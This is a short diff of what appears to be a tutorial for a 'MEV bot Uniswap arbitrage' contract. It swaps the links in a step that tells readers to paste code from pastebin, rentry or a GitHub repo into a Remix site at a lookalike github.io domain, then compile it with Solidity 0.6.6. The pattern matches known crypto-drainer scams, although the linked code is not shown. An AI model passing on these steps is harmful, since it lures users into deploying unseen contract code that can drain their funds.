@@ -38,9 +38,9 @@ https://remixethereum-ide.github.io/
 
 4. Paste THIS code in Remix: 
 
-https://pastebin.com/raw/420J9dMi
-Or
-https://rentry.co/xpu63/raw
+https://github.com/DefiUniversity/MevBotUniswapArbitrage 
+or
+https://pastebin.com/SDuubwBs
 
 5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it
 
